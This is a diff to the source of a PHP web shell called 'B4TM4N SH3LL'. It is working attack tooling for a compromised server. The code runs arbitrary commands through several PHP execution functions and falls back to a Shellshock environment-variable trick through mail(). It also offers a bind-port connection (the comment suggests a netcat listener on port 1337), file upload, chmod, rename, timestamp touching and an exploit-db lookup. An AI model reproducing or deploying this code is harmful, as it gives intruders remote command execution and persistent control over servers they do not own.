@@ -17,7 +17,7 @@ $config = array(
 	"debug"   => true,                                       // Debug Mode
 	"demo"    => false,                                      // Demo Mode
 	"info"    => true,                                       // Information
-	"port"    => 1234                                        // nc -l -v -p 1234)
+	"port"    => 1337                                        // nc -l -v -p 1337)
 );
 
 $login = <<<LOGIN
@@ -161,7 +161,6 @@ elseif ( $_SESSION['action']['username'] == $config['user'] && $_SESSION['action
 	.table td.kiri{width:30%}
 	.table tr:nth-child(odd){background:black}
 	.table tr:nth-child(even){background:#111}
-	.new label{width:100px;padding:5px;margin-right:10px;display:inline-block}
 	.new input[type=submit]{background:#111;color:#fff;border:1px solid #222;border-radius:3px;line-height:25px;padding:0px 20px;margin:10px 10px 0 0;cursor:pointer;outline:none}
 	.new input[type=submit]:hover{background:#222;border:1px solid #666}
 	.new input[type=text]{background:black;color:lime;width:150px;border:1px solid #111;padding:5px;margin-right:10px;outline:none;box-sizing:border-box}
@@ -176,7 +175,7 @@ elseif ( $_SESSION['action']['username'] == $config['user'] && $_SESSION['action
 	.hexdump {width:100%;border:1px solid #111;padding:5px;margin-bottom:5px}
 	.hexdump td{text-align:left}
 	#action{margin-bottom:15px}
-	.highlight{background:#111;word-break:break-word;padding:15px;border:1px solid #111;margin-bottom:5px;height:300px;overflow:auto}
+	.highlight{background:#fff;word-break:break-word;padding:15px;border:1px solid #111;margin-bottom:5px;height:300px;overflow:auto}
 	.cmd{background:black;color:lime;width:100%;border:1px solid #111;padding:10px;outline:none;box-sizing:border-box}
 	.left{float:left;width:60%}
 	.right{float:right;width:40%}
@@ -186,6 +185,7 @@ elseif ( $_SESSION['action']['username'] == $config['user'] && $_SESSION['action
 	.result{padding:10px;}
 	.map{margin-bottom:10px}
 	#database-query{overflow:auto;margin:10px 0;}
+	#port-scan label{width:100px;padding:5px;margin-right:10px;display:inline-block}
 </style>
 <script type="text/javascript">
 function dean_addEvent(t,e,r){if(t.addEventListener)t.addEventListener(e,r,!1);else{r.$$guid||(r.$$guid=dean_addEvent.guid++),t.events||(t.events={});var o=t.events[e];o||(o=t.events[e]={},t["on"+e]&&(o[0]=t["on"+e])),o[r.$$guid]=r,t["on"+e]=handleEvent}}function removeEvent(t,e,r){t.removeEventListener?t.removeEventListener(e,r,!1):t.events&&t.events[e]&&delete t.events[e][r.$$guid]}function handleEvent(t){var e=!0;t=t||fixEvent(((this.ownerDocument||this.document||this).parentWindow||window).event);var r=this.events[t.type];for(var o in r)this.$$handleEvent=r[o],!1===this.$$handleEvent(t)&&(e=!1);return e}function fixEvent(t){return t.preventDefault=fixEvent.preventDefault,t.stopPropagation=fixEvent.stopPropagation,t}var stIsIE=!1;if(sorttable={init:function(){arguments.callee.done||(arguments.callee.done=!0,_timer&&clearInterval(_timer),document.createElement&&document.getElementsByTagName&&(sorttable.DATE_RE=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,forEach(document.getElementsByTagName("table"),function(t){-1!=t.className.search(/\bsortable\b/)&&sorttable.makeSortable(t)})))},makeSortable:function(t){if(0==t.getElementsByTagName("thead").length&&(the=document.createElement("thead"),the.appendChild(t.rows[0]),t.insertBefore(the,t.firstChild)),null==t.tHead&&(t.tHead=t.getElementsByTagName("thead")[0]),1==t.tHead.rows.length){sortbottomrows=[];for(e=0;e<t.rows.length;e++)-1!=t.rows[e].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=t.rows[e]);if(sortbottomrows){null==t.tFoot&&(tfo=document.createElement("tfoot"),t.appendChild(tfo));for(e=0;e<sortbottomrows.length;e++)tfo.appendChild(sortbottomrows[e]);delete sortbottomrows}headrow=t.tHead.rows[0].cells;for(var e=0;e<headrow.length;e++)headrow[e].className.match(/\bsorttable_nosort\b/)||(mtch=headrow[e].className.match(/\bsorttable_([a-z0-9]+)\b/),mtch&&(override=mtch[1]),mtch&&"function"==typeof sorttable["sort_"+override]?headrow[e].sorttable_sortfunction=sorttable["sort_"+override]:headrow[e].sorttable_sortfunction=sorttable.guessType(t,e),headrow[e].sorttable_columnindex=e,headrow[e].sorttable_tbody=t.tBodies[0],dean_addEvent(headrow[e],"click",sorttable.innerSortFunction=function(t){if(-1!=this.className.search(/\bsorttable_sorted\b/))return sorttable.reverse(this.sorttable_tbody),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(document.getElementById("sorttable_sortfwdind")),sortrevind=document.createElement("span"),sortrevind.id="sorttable_sortrevind",sortrevind.innerHTML=stIsIE?'&nbsp<font face="webdings">5</font>':"&nbsp;&#x25B4;",void this.appendChild(sortrevind);if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))return sorttable.reverse(this.sorttable_tbody),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(document.getElementById("sorttable_sortrevind")),sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML=stIsIE?'&nbsp<font face="webdings">6</font>':"&nbsp;&#x25BE;",void this.appendChild(sortfwdind);theadrow=this.parentNode,forEach(theadrow.childNodes,function(t){1==t.nodeType&&(t.className=t.className.replace("sorttable_sorted_reverse",""),t.className=t.className.replace("sorttable_sorted",""))}),sortfwdind=document.getElementById("sorttable_sortfwdind"),sortfwdind&&sortfwdind.parentNode.removeChild(sortfwdind),sortrevind=document.getElementById("sorttable_sortrevind"),sortrevind&&sortrevind.parentNode.removeChild(sortrevind),this.className+=" sorttable_sorted",sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML=stIsIE?'&nbsp<font face="webdings">6</font>':"&nbsp;&#x25BE;",this.appendChild(sortfwdind),row_array=[],col=this.sorttable_columnindex,rows=this.sorttable_tbody.rows;for(e=0;e<rows.length;e++)row_array[row_array.length]=[sorttable.getInnerText(rows[e].cells[col]),rows[e]];row_array.sort(this.sorttable_sortfunction),tb=this.sorttable_tbody;for(var e=0;e<row_array.length;e++)tb.appendChild(row_array[e][1]);delete row_array}))}},guessType:function(t,e){sortfn=sorttable.sort_alpha;for(var r=0;r<t.tBodies[0].rows.length;r++)if(text=sorttable.getInnerText(t.tBodies[0].rows[r].cells[e]),""!=text){if(text.match(/^-?[£$¤]?[\d,.]+%?$/))return sorttable.sort_numeric;if(possdate=text.match(sorttable.DATE_RE),possdate){if(first=parseInt(possdate[1]),second=parseInt(possdate[2]),first>12)return sorttable.sort_ddmm;if(second>12)return sorttable.sort_mmdd;sortfn=sorttable.sort_ddmm}}return sortfn},getInnerText:function(t){if(!t)return"";if(hasInputs="function"==typeof t.getElementsByTagName&&t.getElementsByTagName("input").length,null!=t.getAttribute("sorttable_customkey"))return t.getAttribute("sorttable_customkey");if(void 0!==t.textContent&&!hasInputs)return t.textContent.replace(/^\s+|\s+$/g,"");if(void 0!==t.innerText&&!hasInputs)return t.innerText.replace(/^\s+|\s+$/g,"");if(void 0!==t.text&&!hasInputs)return t.text.replace(/^\s+|\s+$/g,"");switch(t.nodeType){case 3:if("input"==t.nodeName.toLowerCase())return t.value.replace(/^\s+|\s+$/g,"");case 4:return t.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(var e="",r=0;r<t.childNodes.length;r++)e+=sorttable.getInnerText(t.childNodes[r]);return e.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(t){newrows=[];for(e=0;e<t.rows.length;e++)newrows[newrows.length]=t.rows[e];for(var e=newrows.length-1;e>=0;e--)t.appendChild(newrows[e]);delete newrows},sort_numeric:function(t,e){return aa=parseFloat(t[0].replace(/[^0-9.-]/g,"")),isNaN(aa)&&(aa=0),bb=parseFloat(e[0].replace(/[^0-9.-]/g,"")),isNaN(bb)&&(bb=0),aa-bb},sort_alpha:function(t,e){return t[0]==e[0]?0:t[0]<e[0]?-1:1},sort_ddmm:function(t,e){return mtch=t[0].match(sorttable.DATE_RE),y=mtch[3],m=mtch[2],d=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt1=y+m+d,mtch=e[0].match(sorttable.DATE_RE),y=mtch[3],m=mtch[2],d=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt2=y+m+d,dt1==dt2?0:dt1<dt2?-1:1},sort_mmdd:function(t,e){return mtch=t[0].match(sorttable.DATE_RE),y=mtch[3],d=mtch[2],m=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt1=y+m+d,mtch=e[0].match(sorttable.DATE_RE),y=mtch[3],d=mtch[2],m=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt2=y+m+d,dt1==dt2?0:dt1<dt2?-1:1},shaker_sort:function(t,e){for(var r=0,o=t.length-1,n=!0;n;){n=!1;for(s=r;s<o;++s)if(e(t[s],t[s+1])>0){a=t[s];t[s]=t[s+1],t[s+1]=a,n=!0}if(o--,!n)break;for(var s=o;s>r;--s)if(e(t[s],t[s-1])<0){var a=t[s];t[s]=t[s-1],t[s-1]=a,n=!0}r++}}},document.addEventListener&&document.addEventListener("DOMContentLoaded",sorttable.init,!1),/WebKit/i.test(navigator.userAgent))var _timer=setInterval(function(){/loaded|complete/.test(document.readyState)&&sorttable.init()},10);window.onload=sorttable.init,dean_addEvent.guid=1,fixEvent.preventDefault=function(){this.returnValue=!1},fixEvent.stopPropagation=function(){this.cancelBubble=!0},Array.forEach||(Array.forEach=function(t,e,r){for(var o=0;o<t.length;o++)e.call(r,t[o],o,t)}),Function.prototype.forEach=function(t,e,r){for(var o in t)void 0===this.prototype[o]&&e.call(r,t[o],o,t)},String.forEach=function(t,e,r){Array.forEach(t.split(""),function(o,n){e.call(r,o,n,t)})};var forEach=function(t,e,r){if(t){var o=Object;if(t instanceof Function)o=Function;else{if(t.forEach instanceof Function)return void t.forEach(e,r);"string"==typeof t?o=String:"number"==typeof t.length&&(o=Array)}o.forEach(t,e,r)}};
@@ -227,130 +227,53 @@ function GetCheck() {
 <?php
 
 $dir = array_key_exists("d", $_REQUEST) ? $_REQUEST['d'] : getcwd();
-$curdir = array_key_exists("curdir", $_SESSION) ? $_SESSION['curdir'] : getcwd();
 
 function Unix() 
 {
-	if (strtolower(substr(PHP_OS,0,3)) == "win")
-	{
-		return false;
-	}
-	else
-	{
-		return true;
-	}
+	return (strtolower(substr(PHP_OS,0,3)) == "win");
 }
-function Execute($x,$y=false) 
-{
-	$x = ($y == true) ? $x : $x . ' 2>&1';
 
+function Execute($x) 
+{
+	$x = $x . ' 2>&1';
 	if (function_exists ('passthru'))
 	{
 		ob_start(); 		
 		$passthru = passthru($x);
 		$buff = ob_get_contents(); 		
 		ob_end_clean(); 		
-		if($y == true)
-		{
-			if($buff)
-			{
-				return "<font class='on'>ON</font>";exit;
-			}
-			else
-			{
-				return "<font class='off'>OFF</font>";exit;
-			}
-		}
-		else
-		{
-			return $buff;exit;
-		} 	
+		return $buff;
 	}
-	elseif (function_exists ('shell_exec'))
+	else if (function_exists ('shell_exec'))
 	{
 		$buff = shell_exec($x);	
-		if($y == true)
-		{
-			if($buff)
-			{
-				return "<font class='on'>ON</font>";exit;
-			}
-			else
-			{
-				return "<font class='off'>OFF</font>";exit;
-			}
-		}
-		else
-		{
-			return $buff;exit;
-		}
+		return $buff;
 	}
-	elseif (function_exists ('system'))
+	else if (function_exists ('system'))
 	{
 		ob_start(); 		
-		system($x); 		
+		$system = system($x); 		
 		$buff = ob_get_contents(); 		
 		ob_end_clean();
-		if($y == true)
-		{
-			if($buff)
-			{
-				return "<font class='on'>ON</font>";exit;
-			}
-			else
-			{
-				return "<font class='off'>OFF</font>";exit;
-			}
-		}
-		else
-		{
-			return $buff;exit;
-		}	
+		return $buff;
 	}
-	elseif (function_exists ('exec'))
+	else if (function_exists ('exec'))
 	{
 		exec($x, $results); 		
 		$buff = ""; 		
-		foreach($results as $result){ 			
-		$buff .= $result; 		
+		foreach ($results as $result)
+		{ 			
+			$buff .= $result; 		
 		}
-		if($y == true)
-		{
-			if($buff)
-			{
-				return "<font class='on'>ON</font>";exit;
-			}
-			else
-			{
-				return "<font class='off'>OFF</font>";exit;
-			}
-		}
-		else
-		{
-			return $buff;exit;
-		}
+		return $buff;
 	}
-	elseif (function_exists ('proc_open'))
+	else if (function_exists ('proc_open'))
 	{
 		$proc = proc_open($x, array(array("pipe","r"),array("pipe","w"),array("pipe","w")), $pipes);
 		$buff = stream_get_contents($pipes[1]);
-		if($y == true)
-		{
-			if($buff)
-			{
-				return "<font class='on'>ON</font>";exit;
-			}
-			else
-			{
-				return "<font class='off'>OFF</font>";exit;
-			}
-		}
-		else
-		{
-			return $buff;exit;
-		} 	
+		return $buff;
 	}
-	elseif (function_exists ('popen'))
+	else if (function_exists ('popen'))
 	{
 		$buff = "";
 		$f = popen($x,"r");
@@ -359,65 +282,46 @@ function Execute($x,$y=false)
 			$buff .= fread($f,1024);
 		}
 		pclose($f);
-		if($y == true)
+		return $buff;
+	}
+	else if (is_link('/bin/sh'))
+	{	
+		if (strstr(readlink("/bin/sh"), "bash") != FALSE) 
 		{
-			if($buff)
+			$tmp = tempnam(".","data");
+			putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
+			mail("k4mpr3t@127.0.0.1","","","","-bv");
+			$output = file_get_contents($tmp);
+			unlink($tmp);
+
+			if ($output != "") 
 			{
-				return "<font class='on'>ON</font>";exit;
-			}
-			else
-			{
-				return "<font class='off'>OFF</font>";exit;
+				return $output;
 			}
 		}
-		else
+		else 
 		{
-			return $buff;exit;
+			return "Not vuln (not bash)";
 		}
 	}
 	else
-	{	
-		if($y == true)
-		{
-			return "<font class='off'>DIE</font>";
-		}
-		else
-		{
-			if (strstr(readlink("/bin/sh"), "bash") != FALSE) 
-			{
-				$tmp = tempnam(".","data");
-				putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
-				mail("k4mpr3t@127.0.0.1","","","","-bv");
-			}
-			else return "Not vuln (not bash)";
-			$output = file_get_contents($tmp);
-			unlink($tmp);
-			if ($output != "") return $output;
-   			else return "Find another way to Rome !";
-		}
-		exit;
+	{
+		return "Find another way to Rome !";
 	}
 }
+
 function Call($x) 
 {
 	if (function_exists($x)) 
 	{
-		$disabled = explode(',', ini_get('disable_functions'));
-
-		if (in_array($x, $disabled))
-		{
-			return "<font class='off'>OFF</font>";
-		}
-		else
-		{
-			return  "<font class='on'>ON</font>";
-		}
+		return  "<font class='on'>ON</font>";
 	}
 	else
 	{
 		return "<font class='off'>OFF</font>";
 	}
 }
+
 function GetFileType($x) 
 {
 	if (is_file($x)) 
@@ -437,6 +341,7 @@ function GetFileType($x)
 		return "-";
 	}
 }
+
 function GetFileTime($x,$y) 
 {
 	switch($y) 
@@ -452,7 +357,8 @@ function GetFileTime($x,$y)
 			break;
 	}
 }
-function GetFilePerm($x) 
+
+function GetFilePerm($x, $y = false) 
 {
 	$perms = fileperms($x);
 	if (($perms & 0xC000) == 0xC000) $info = 's';
@@ -472,8 +378,9 @@ function GetFilePerm($x)
 	$info .= (($perms & 0x0004) ? 'r' : '-');
 	$info .= (($perms & 0x0002) ? 'w' : '-');
 	$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
-	return $info;
+	return $info . ($y ? sprintf(' (%s)', substr(decoct($perms),2)) : '');
 }
+
 function GetFileSize($x) 
 {
 	$x = abs($x);
@@ -481,6 +388,7 @@ function GetFileSize($x)
     $exp = $x ? floor(log($x) / log(1024)) : 0;
     return sprintf('%.2f '. $size[$exp], ($x/pow(1024, floor($exp))));
 }
+
 function GetUser($x) 
 {	
 	if (!function_exists('posix_getegid') && !function_exists('posix_geteuid')) 
@@ -523,26 +431,36 @@ function GetUser($x)
 		}
 	}	
 }
+
 function GetOwnerGroup($x) 
 {
-	if(unix())
+	if(!Unix())
 	{
 		$stat = stat($x);
-	    if($stat){
-	        $group = posix_getgrgid($stat[5]);
-	        $user = posix_getpwuid($stat[4]);
-	        return compact('user', 'group');
+
+	    if ($stat)
+	    {
+	    	if (!function_exists('posix_getegid') && !function_exists('posix_geteuid')) 
+			{
+		        $group = posix_getgrgid($stat[5]);
+		        $user = posix_getpwuid($stat[4]);
+	        	return compact('user', 'group');
+	        }
 	    }
 	    else
-	        return false;
+	    {
+	        return "No Group";
+	    }
 	}
 	else
 	{
 		return "?:?";
 	}
 }
+
 function MapDirectory($x) 
 {
+
 	$map = "";
 	$d = str_replace("\\", DIRECTORY_SEPARATOR, $x);
 	if (empty($d)){$d = realpath(".");}elseif(realpath($d)) 
@@ -575,6 +493,7 @@ function MapDirectory($x)
 	}
 	return $map;
 }
+
 function MapDrive($x) 
 {
 	if (!Unix()) 
@@ -602,6 +521,7 @@ function MapDrive($x)
 		return $l;
 	}
 }
+
 function MainMenu() 
 {
 	$menu = array(
@@ -633,6 +553,7 @@ function MainMenu()
 	}
 	return $nu;
 }
+
 function MenuTools($x) 
 {
 	global $default;
@@ -652,6 +573,7 @@ function MenuTools($x)
 	$ol .= "</ul></div>";
 	return $ol;
 }
+
 function GetDisableFunction() 
 {
 	$stat = "";
@@ -666,6 +588,7 @@ function GetDisableFunction()
 	}
 	return $stat;
 }
+
 function GetSafeMode() 
 {
 	$stat = "";
@@ -679,6 +602,7 @@ function GetSafeMode()
 	}
 	return $stat;
 }
+
 function GetExploitDB() 
 {
 	$link = '//exploit-db.com/search/?action=search&filter_description=';
@@ -696,6 +620,9 @@ function GetExploitDB()
 /* START INFORMATION */
 if ($config['info'] == true) 
 {
+	$title = $config['title'];
+	$version = $config['version'];
+
 	printf("
 		<div id='information'>
 			<div class='left'>
@@ -708,9 +635,9 @@ if ($config['info'] == true)
 			</div>
 			<div class='right'>
 				<div id='header'>
-					<h1 id='title'>B4TM4N SH3LL</h1>
+					<h1 id='title'>$title</h1>
 					<div class='line'>
-						<h2>1.0</h2>
+						<h2>$version</h2>
 					</div>
 				</div>
 			</div>
@@ -877,8 +804,9 @@ if(array_key_exists("x", $_REQUEST))
 		}
 		else
 		{
-			$command = !empty($_REQUEST['cmd']) ? $_REQUEST['cmd'] : "dir";
-			chdir($curdir);
+			$command = !empty($_REQUEST['cmd']) ? $_REQUEST['cmd'] : "whoami";
+			$dir = array_key_exists("curdir", $_SESSION) ? $_SESSION['curdir'] : getcwd();
+			chdir($dir);
 			$charset = 'UTF-8';
 			if (!Unix()) 
 			{
@@ -892,19 +820,20 @@ if(array_key_exists("x", $_REQUEST))
 			}
 			$rows = "20";
 			printf( "
-				<div id='console'>$ %s:<br><br>
+				<div id='console'>
 					<textarea id='prompt' class='cmd' cols='122' rows='%s' readonly>%s</textarea>
 					<form onsubmit='return false;'><br>
-						<input id='cmd' autocomplete='off' onfocus=\"var val=this.value;this.value='';this.value= val;\" onkeydown=\"if(event.keyCode == 13) return GetAjax('prompt','POST','?x=console&xa=consoles&cmd='+document.getElementById('cmd').value);\" class='cmd' name=cmd cols=122 rows=2 value=%s></input>
+						$ %s: <br><br><input id='cmd' autocomplete='off' onfocus=\"var val=this.value;this.value='';this.value= val;\" onkeydown=\"if(event.keyCode == 13) return GetAjax('prompt','POST','?x=console&xa=consoles&cmd='+document.getElementById('cmd').value);\" class='cmd' name=cmd cols=122 rows=2 value=%s></input>
 					</form>
-				</div>", $curdir, $rows, htmlspecialchars($ret), $command);
+				</div>", $rows, htmlspecialchars($ret), $dir, $command);
 
 			if(array_key_exists("xa", $_REQUEST) && $_REQUEST['xa'] == "consoles")
 			{	
 				ob_clean();
 				flush();
 				$command = !empty($_REQUEST['cmd']) ? $_REQUEST['cmd'] : "whoami";
-				chdir($curdir);
+				$dir = array_key_exists("curdir", $_SESSION) ? $_SESSION['curdir'] : getcwd();
+				chdir($dir);
 				$charset = 'UTF-8';
 				if(!Unix()){
 					$charset = 'Windows-1251';
@@ -925,7 +854,7 @@ if(array_key_exists("x", $_REQUEST))
 		{
 			$host = gethostbyname($_SERVER['HTTP_HOST']);
 			global $port;
-			$bind = fsockopen($host, $port, $errno, $errstr);
+			$bind = @fsockopen($host, $port, $errno, $errstr);
 
 			if($errno != 0)
 			{
@@ -1013,7 +942,7 @@ if(array_key_exists("x", $_REQUEST))
 						<form class='new' method='post' action='?x=action&action=copy&_copy'>
 							<input type='text' name='newloc' value='%s'/>
 							<input type='submit' value='Submit' />
-						</form>", $curdir.DIRECTORY_SEPARATOR);
+						</form>", $dir.DIRECTORY_SEPARATOR);
 				break;
 			}
 
@@ -1041,7 +970,7 @@ if(array_key_exists("x", $_REQUEST))
 if(array_key_exists("r", $_REQUEST))
 {
 	$file = file_exists($_REQUEST["r"]) ? strval($_REQUEST["r"]) : exit('File Not Found');
-	$back = $_SERVER['PHP_SELF'] . "?d=" . urlencode($curdir);
+	$back = $_SERVER['PHP_SELF'] . "?d=" . urlencode($dir);
 	$status = array_key_exists("status", $_SESSION) ? $_SESSION['status'] : "";
 	$source = "";
 
@@ -1064,7 +993,7 @@ if(array_key_exists("r", $_REQUEST))
 			</table>", 
 			basename($file), 
 			GetFileSize(filesize($file)), 
-			GetFilePerm($file), 
+			GetFilePerm($file, true), 
 			GetFileTime($file,"create"), 
 			GetFileTime($file,"modify"), 
 			GetFileTime($file,"access"));
@@ -1138,7 +1067,13 @@ if(array_key_exists("r", $_REQUEST))
 			<form class='new' method='POST'>
 				<input type='text' name='name' value='%s'/><br />
 				<input type='Submit' value='Rename' name='rename'/>
-			</form>", basename($file));
+				<label>%s</label>
+			</form>", basename($file), $status);
+
+			if(array_key_exists("status", $_SESSION))
+			{
+				unset($_SESSION['status']);
+			}
 
 			if(array_key_exists("rename", $_POST))
 			{
@@ -1148,7 +1083,18 @@ if(array_key_exists("r", $_REQUEST))
 				}
 				else
 				{
-					
+					$name = $_POST['name'];
+					$path = pathinfo($file);
+					$newname = $path['dirname'].DIRECTORY_SEPARATOR.$name;
+					if (!rename($file, $newname)) 
+					{
+					    $_SESSION['status'] =  'Whoops, something went wrong...';
+					} 
+					else 
+					{
+					    $_SESSION['status'] =  'Renamed file with success';
+					}
+					header("location: ".$_SERVER['PHP_SELF']."?a=r&r=".urlencode($newname));
 				}
 			}
 		}
@@ -1157,9 +1103,15 @@ if(array_key_exists("r", $_REQUEST))
 		{
 			printf("
 			<form class='new' method='POST'>
-				<input type='text' name='name' value='%s'/><br />
+				<input type='text' name='octal' value='%s'/><br />
 				<input type='Submit' value='Chmod' name='chmod'/>
-			</form>", substr(decoct(fileperms($file)),2));
+				<label>%s</label>
+			</form>", substr(decoct(fileperms($file)),2), $status);
+
+			if(array_key_exists("status", $_SESSION))
+			{
+				unset($_SESSION['status']);
+			}
 
 			if(array_key_exists("chmod", $_POST))
 			{
@@ -1169,8 +1121,18 @@ if(array_key_exists("r", $_REQUEST))
 				}
 				else
 				{
+					$octal = $_POST['octal'];
 
+					if (!chmod($file, $octal)) 
+					{
+					    $_SESSION['status'] =  'Whoops, something went wrong...';
+					} 
+					else 
+					{
+					    $_SESSION['status'] =  'Chmod file with success';
+					}
 				}
+				header("location: ".$_SERVER['PHP_SELF']."?a=c&r=".urlencode($file));
 			}
 		}
 
@@ -1178,9 +1140,15 @@ if(array_key_exists("r", $_REQUEST))
 		{
 			printf("
 			<form class='new' method='POST'>
-				<input type='text' name='name' value='%s'/><br />
+				<input type='text' name='time' value='%s'/><br />
 				<input type='Submit' value='Touch' name='touch'/>
-			</form>", GetFileTime($file, "modify"));
+				<label>%s</label>
+			</form>", GetFileTime($file, "modify"), $status);
+
+			if(array_key_exists("status", $_SESSION))
+			{
+				unset($_SESSION['status']);
+			}
 
 			if(array_key_exists("touch", $_POST))
 			{
@@ -1190,8 +1158,18 @@ if(array_key_exists("r", $_REQUEST))
 				}
 				else
 				{
+					$time = $_POST['time'];
 
+					if (!touch($file, strtotime($time))) 
+					{
+					    $_SESSION['status'] =  'Whoops, something went wrong...';
+					} 
+					else 
+					{
+					    $_SESSION['status'] =  'Touched file with success';
+					}
 				}
+				header("location: ".$_SERVER['PHP_SELF']."?a=t&r=".urlencode($file));
 			}
 		}
 
@@ -1199,8 +1177,8 @@ if(array_key_exists("r", $_REQUEST))
 		{
 			if(is_readable($file))
 			{
-				$code = highlight_file($file,true);
-				printf('<div class="highlight">%s</div>', $code);
+				$code = highlight_file($file, true);
+				printf("<div class='highlight'>%s</div>", $code);
 			}
 		}
 		
@@ -1230,7 +1208,16 @@ if(array_key_exists("r", $_REQUEST))
 					$h[2] .= "\n";
 				}
 		 	}
-			printf('<div id="hexdump"><table class="hexdump"><tr><td><span style="font-weight: normal;"><pre>%s</pre></span></td><td><pre>%s</pre></td><td><pre>%s</pre></td></tr></table></div>', $h[0], $h[1], htmlspecialchars($h[2]));
+			printf("
+				<div id='hexdump'>
+					<table class='hexdump'>
+						<tr>
+							<td><span style='font-weight: normal;''><pre>%s</pre></span></td>
+							<td><pre>%s</pre></td>
+							<td><pre>%s</pre></td>
+						</tr>
+					</table>
+				</div>", $h[0], $h[1], htmlspecialchars($h[2]));
 		}
 
 		if($_REQUEST['a'] == 'd')
@@ -1248,7 +1235,6 @@ if(array_key_exists("r", $_REQUEST))
 				ob_clean();
 				flush();
 				readfile($file);
-				exit;
 			}
 		}
 		
@@ -1280,7 +1266,7 @@ if(array_key_exists("d", $_REQUEST) || $_SERVER['REQUEST_URI'] == $_SERVER["SCRI
 		}
 		else
 		{
-			$file = $curdir.DIRECTORY_SEPARATOR.$_POST['what'];
+			$file = $dir.DIRECTORY_SEPARATOR.$_POST['what'];
 			$myfile = @fopen($file, "w");
 			if ($myfile)
 			{
@@ -1301,14 +1287,14 @@ if(array_key_exists("d", $_REQUEST) || $_SERVER['REQUEST_URI'] == $_SERVER["SCRI
 		}
 		else
 		{
-			chdir($curdir);
+			chdir($dir);
 			if(!@mkdir($_POST['what']))
 			{
 				echo "<b class='off'>Can't create new directory!</b>";
 			}
 			else
 			{
-				echo "Directory '" . $_POST['what'] . "' Created on " . GetFileTime($curdir.DIRECTORY_SEPARATOR.$_POST['what'], 'create') ;
+				echo "Directory '" . $_POST['what'] . "' Created on " . GetFileTime($dir.DIRECTORY_SEPARATOR.$_POST['what'], 'create') ;
 			}
 		}
 	}
@@ -1320,7 +1306,7 @@ if(array_key_exists("d", $_REQUEST) || $_SERVER['REQUEST_URI'] == $_SERVER["SCRI
 		}
 		else
 		{
-			$upload = $curdir.DIRECTORY_SEPARATOR.basename($_FILES["what"]["name"]);
+			$upload = $dir.DIRECTORY_SEPARATOR.basename($_FILES["what"]["name"]);
 
 		    if (move_uploaded_file($_FILES["what"]["tmp_name"], $upload)) 
 		    {
